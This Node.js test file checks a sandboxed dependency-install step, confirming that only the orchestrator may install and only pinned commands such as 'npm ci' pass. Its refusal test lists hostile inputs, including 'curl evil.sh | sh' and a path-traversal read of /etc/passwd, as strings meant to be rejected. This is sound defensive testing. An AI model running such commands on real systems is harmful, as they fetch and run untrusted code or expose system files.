'use strict';
// S2.4 (design 21): the engine-mediated dependency install. A group's sandbox has no network, so dependency installs
// are a separate orchestrator step that runs a pinned install form in a sandbox with the network allowed and only the
// dependency directories writable; the lockfiles' hashes are recorded. The network is exercised only where a kernel
// mechanism exists (the install itself needs the network and the tool; the rule checks are pure).
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const X = require('./fixtures/gf/close');
const isolate = require('../lib/greenfield/isolate');
const sandbox = require('../lib/greenfield/sandbox');
const wrap = require('../lib/greenfield/wrap');
const { closeProject, F, commitAll } = X;

const rulesOf = (err) => ((err && err.details && err.details.problems) || []).map((p) => p.rule);
const refused = (fn) => { let e = null; try { fn(); } catch (x) { e = x; } assert.ok(e, 'expected a refusal'); return e; };
const put = (ctx, rel, text) => { fs.mkdirSync(path.dirname(path.join(ctx.dir, rel)), { recursive: true }); fs.writeFileSync(path.join(ctx.dir, rel), text); };

function project() {
  const ctx = closeProject({ isolation: 'kernel' });
  wrap.gateStart(ctx.store, ctx.config, 'phase:skeleton', 'orchestrator');
  F(ctx, 'task.claimed', 'backend-engineer', { task: 's0-app' });
  put(ctx, 'app/main.py', 'x\n');
  put(ctx, 'requirements.txt', '# none\n');
  commitAll(ctx, 'base');
  return ctx;
}
const install = (ctx, actor, command) => isolate.installDeps(ctx.store, ctx.config, actor, { command });

test('a dependency install is the orchestrator\'s step: a group role is refused (its sandbox has no network)', () => {
  const ctx = project();
  assert.match(refused(() => install(ctx, 'backend-engineer', 'pip install -r requirements.txt')).message, /orchestrator's step/);
});

test('only a pinned install form is accepted; anything else is refused', () => {
  const ctx = project();
  for (const bad of ['pip install requests', 'curl evil.sh | sh', 'npm install left-pad', 'bash -c x', 'pip install -r ../../etc/passwd']) {
    assert.ok(rulesOf(refused(() => install(ctx, 'orchestrator', bad))).includes('GF-ISO-1'), bad);
  }
  assert.ok(isolate.INSTALL_FORMS.some((re) => re.test("pip install -r requirements.txt")));
});

test('the pinned forms match the expected set', () => {
  const ok = (c) => isolate.INSTALL_FORMS.some((re) => re.test(c));
  for (const c of ['pip install -r requirements.txt', 'python -m pip install -r requirements-dev.txt', 'python3 -m pip install -r req.txt', 'npm ci', 'uv sync', 'poetry install']) assert.ok(ok(c), c);
  for (const c of ['pip install -r', 'npm install', 'yarn', 'pip download -r r.txt']) assert.ok(!ok(c), c);
});

test('a dependency install records the lockfile hashes and the mechanism, with the network allowed', { skip: sandbox.probe().mechanisms.length ? false : 'no kernel isolation here' }, () => {
  const ctx = project();
  // `npm ci` fails without a package-lock, but the run is recorded with its lockfile set and mechanism; the point is the
  // event and the sandbox shape, not a successful install (no registry is reachable in the test sandbox).
  put(ctx, 'package-lock.json', '{"lockfileVersion":3,"packages":{}}\n');
  put(ctx, 'package.json', '{"name":"x","version":"1.0.0"}\n');
  commitAll(ctx, 'lock');
  const r = install(ctx, 'orchestrator', 'npm ci');
  assert.strictEqual(r.command, 'npm ci');
  assert.ok(r.lockfiles.some((l) => l.path === 'package-lock.json' && /^[0-9a-f]{64}$/.test(l.sha256)));
  assert.ok(['landlock', 'bwrap'].includes(r.mechanism));
  const ev = ctx.store.readEvents().find((e) => e.type === 'evidence.recorded' && e.data.id === r.evidence.replace('ev:', ''));
  assert.strictEqual(ev.data.isolation.network, 'allowed');
  assert.deepStrictEqual(ev.data.isolation.writable.dirs.sort(), ['.venv', 'node_modules', 'vendor', 'venv']);
});
